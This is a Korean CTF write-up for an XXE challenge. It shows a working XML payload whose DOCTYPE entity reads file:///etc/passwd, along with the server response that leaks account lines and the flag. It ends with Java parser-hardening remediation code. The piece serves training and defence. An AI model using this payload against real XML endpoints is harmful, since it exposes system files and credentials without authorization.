+++
title = "VulnABLE CTF [LUXORA] Write-up: XXE 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "XXE", "Bronze", "XML", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: XXE 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (XXE - XML External Entity)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/xxe/bronze`
- **목표**: 사용자가 입력한 XML 데이터를 처리하는 백엔드 파서(Parser)의 취약점을 이용하여, 외부 엔티티(External Entity)를 주입하고 서버의 로컬 파일(`/etc/passwd` 등)을 화면에 출력하게 만들어라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/xxe/bronze` 페이지는 XML 형식으로 상품의 재고나 설명을 조회하는 기능입니다. (예: B2B API 연동)

**[정상 XML 요청 패킷]**
```http
POST /xxe/bronze HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<product>
  <id>1001</id>
  <name>Premium Laptop</name>
</product>
```

**[서버의 정상 응답]**
```html
<div class="result">
  Item: Premium Laptop (ID: 1001) is available.
</div>
```

**[해커의 사고 과정]**
1. 이 시스템은 클라이언트가 보낸 XML을 그대로 파싱(Parsing)하여, `<name>` 태그의 값을 화면에 반환하고 있다.
2. XML에는 **DTD (Document Type Definition)**라는 강력한 기능이 있다. 매크로처럼 특정 단어(Entity)에 긴 문장이나 파일의 내용을 담아둘 수 있다.
3. 만약 내가 `&xxe;` 라는 엔티티를 만들고, 그 내용을 서버의 로컬 파일인 `/etc/passwd` 로 선언한다면?
4. 파서가 외부 엔티티(External Entity) 로딩을 허용하고 있다면, 파일 내용이 화면에 출력될 것이다!

---

## 💥 2. 취약점 식별 및 악성 XML 조립 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(XML with <!ENTITY xxe SYSTEM "file:///etc/passwd">)--> [ Web Server ]
                                                                       |-- Parses XML & Reads File
<-- File Contents Returned --------------------------------------------|
```


이른바 **In-band XXE (대역 내 XXE)** 공격입니다.

### 💡 DTD를 이용한 악성 페이로드 작성
XML의 `<!DOCTYPE>` 선언부에 시스템 파일을 가리키는 외부 엔티티를 정의하고, 본문(`<name>`)에서 이를 호출(`&xxe;`)합니다.

**[주입할 악성 XML 페이로드]**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- DTD 영역: xxe라는 엔티티를 만들고, 그 값을 /etc/passwd 파일 내용으로 채운다 -->
<!DOCTYPE product [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<product>
  <id>1001</id>
  <!-- 본문에서 xxe 엔티티를 호출 -->
  <name>&xxe;</name>
</product>
```

---

## 🚀 3. 공격 수행 및 결과 확인

Burp Suite의 Repeater를 이용하여 조작된 XML 데이터를 서버로 전송합니다.

### 🔍 조작된 서버의 응답
서버의 낡은(또는 잘못 설정된) XML 파서는 `SYSTEM "file:///etc/passwd"` 명령을 보고 충실하게 파일 시스템에 접근하여 그 내용을 읽어옵니다. 그리고 `<name>` 태그가 있던 자리에 그 내용을 치환해버립니다!

```html
HTTP/1.1 200 OK

<div class="result">
  Item: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
FLAG{XXE_🥉_BASIC_FILE_READ_D4E5F6}:x:1000:1000::/bin/bash (ID: 1001) is available.
</div>
```

성공입니다! 서버의 중요 계정 정보와 함께 숨겨진 플래그가 화면에 출력되었습니다.

---

## 🚩 4. 롸잇업 결론 및 플래그

XML 데이터 파서의 디폴트 설정(외부 엔티티 허용)을 파고들어, 단순한 정보 조회 기능을 서버 내부 파일 유출 통로로 둔갑시키는 XXE 공격의 정석을 보여주었습니다.

**🔥 획득한 플래그:**
`FLAG{XXE_🥉_BASIC_FILE_READ_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
XML 파싱 라이브러리(Java의 DocumentBuilderFactory, Python의 lxml, Node.js의 libxmljs 등)의 과거 버전들은 외부 엔티티(External Entity)를 해석하는 기능이 **기본적으로 켜져(Enabled) 있었습니다.**

* **안전한 패치 가이드 (파서 설정 하드닝)**
코드에서 XML을 파싱하기 전에, DTD와 외부 엔티티 처리를 완전히 비활성화(Disable)하는 설정을 명시적으로 추가해야 합니다.

**[Java (DocumentBuilderFactory) 예시]**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
String FEATURE = null;
try {
    // 1. 외부 DTD 로딩 완전 금지
    FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";
    dbf.setFeature(FEATURE, true);

    // 2. 외부 일반 엔티티 포함 금지
    FEATURE = "http://xml.org/sax/features/external-general-entities";
    dbf.setFeature(FEATURE, false);

    // 3. 외부 파라미터 엔티티 포함 금지
    FEATURE = "http://xml.org/sax/features/external-parameter-entities";
    dbf.setFeature(FEATURE, false);
} catch (ParserConfigurationException e) {
    // 에러 처리
}
```

현대의 웹 개발에서는 보안과 성능 문제로 인해 XML보다는 **JSON**을 주로 사용하므로, 가능한 한 API 스펙 자체를 JSON으로 전환하는 것이 가장 권장되는 방어책입니다.